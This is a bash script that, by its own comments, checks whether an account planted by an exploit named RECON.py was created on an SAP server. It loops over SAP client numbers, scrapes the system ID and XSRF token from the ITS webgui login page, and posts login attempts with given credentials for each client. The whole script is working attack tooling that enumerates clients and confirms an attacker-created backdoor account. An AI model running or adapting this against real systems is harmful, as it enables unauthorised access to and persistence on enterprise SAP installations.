#!/bin/bash

# The script allows you to check whether the account was created when using the exploit RECON.py or find the mandate of the created account 
# "Use script: ./checker.sh <start mndt> <stop mndt> <ip> <port> <login> <password>"

for i in $(seq -f "%03g" $1 $2) 

do echo -n ${i} ' '

curl -kqs -c /tmp/.cook 'http://'${3}':'${4}'/sap/bc/gui/sap/its/webgui' > /tmp/.site 

sysid=$(cat /tmp/.site | egrep -o 'input id="sysid".*name="sysid"' | awk -F '["]' '{print $18}')

xsrf=$(cat /tmp/.site | egrep 'sap-login-XSRF' | awk -F '"' '{ print $6 }' | cut -d '&' -f 1)

#echo ${sysid}
#echo ${xsrf}
#echo $1
#echo $2
#echo $3
#echo $4
#echo $5
#echo $6

curl -i -s -k -X 'POST' -H 'Host: '${3}':'${4} \
-H 'User-Agent: Mozilla/6.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0' \
-H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5'  \
-H 'Content-Type: application/x-www-form-urlencoded' \
-H 'Origin: http://'${3}':'${4} \
-H 'Connection: close' \
-H 'Referer: http://'${3}':'${4}'/sap/bc/gui/sap/its/webgui' \
-H 'Upgrade-Insecure-Requests: 1' \
-b /tmp/.cook \
--data 'FOCUS_ID=sap-user&sap-system-login-oninputprocessing=onLogin&sap-urlscheme=&sap-system-login=onLogin&sap-system-login-basic_auth=&sap-accessibility=&sap-login-XSRF='${xsrf}'%3D&sap-system-login-cookie_disabled=&sysid='${sysid}'&sap-client='${i}'&sap-user='${5}'&sap-password='${6}'&sap-language=EN&sap-language-dropdown=English&SAPEVENTQUEUE=Form_Submit%6EE002Id%7EE004SL__FORM%7EE003%7EE002ClientAction%7EE004submit%7EE005ActionUrl%7EE004%7EE005ResponseData%7EE004full%7EE005PrepareScript%7EE004%7EE003%7EE002%7EE003' 'http://'${3}':'${4}'/sap/bc/gui/sap/its/webgui' | grep 'HTTP/1.1' 


done
